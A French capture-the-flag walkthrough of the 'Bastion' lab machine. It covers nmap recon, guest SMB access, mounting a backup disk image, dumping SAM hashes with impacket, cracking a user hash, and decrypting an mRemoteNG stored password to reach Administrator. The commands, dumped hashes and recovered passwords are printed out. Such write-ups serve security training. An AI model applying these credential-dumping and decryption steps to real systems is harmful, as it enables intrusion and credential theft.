# Bastion - Easy

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 06:49 EDT
Nmap scan report for 10.10.10.134
Host is up (0.021s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6h39m41s, deviation: 1h09m16s, median: -5h59m42s
| smb2-time: 
|   date: 2023-03-30T04:50:11
|_  start_date: 2023-03-30T04:49:21
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-30T06:50:12+02:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds
```

On essaye alors d’accéder au SMB

```bash
crackmapexec smb 10.10.10.134

/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
```

Pas possible d’énumérer les users ni les disques, on peut se connecter en tant que guest en revanche:

```bash
crackmapexec smb 10.10.10.134 -u "guest" -p "" --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\guest: 
SMB         10.10.10.134    445    BASTION          [+] Enumerated shares
SMB         10.10.10.134    445    BASTION          Share           Permissions     Remark
SMB         10.10.10.134    445    BASTION          -----           -----------     ------
SMB         10.10.10.134    445    BASTION          ADMIN$                          Remote Admin
SMB         10.10.10.134    445    BASTION          Backups         READ            
SMB         10.10.10.134    445    BASTION          C$                              Default share
SMB         10.10.10.134    445    BASTION          IPC$                            Remote IPC
```

On se connecte:

```bash
smbclient \\\\10.10.10.134/Backups -U guest
```

On trouve des backups d’image disque que l’on va essayer d’ouvrir, 7zip est capable de lire les fichiers .vhd donc on peut lister mais aussi monter avec guestmount:

```bash
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd/
```

On va essayer de dump les secrets avec impacket.

```bash
cd Windows/System32/config
impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

Les mdp de Administrator et Guest sont vides, les comptes sont surement désactivés. On tente de casser le hash (la 2éme partie) pour L4mpje sur crackstation, on trouve direct la correspondance avec bureaulampje.

On peut se connecter en SSH comme le montre le recon. On lance powershell pour plus de commandes. On va upload et lancer winPEAS. mRemoteNG est installé, peut être que l’on peut hijack une session ?

[https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)

Cependant il faut récupérer le fichier de config (surtout le mdp stocké dedans) pour l’utiliser avec le script python. Il est trouvable ici:

```bash
C:\Users\L4mpje\AppData\Roaming\mRemoteNG
```

Puis on execute le script:

```bash
python3 exploit.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

On obtient une connexion ssh en tant qu’Administrator et donc le flag final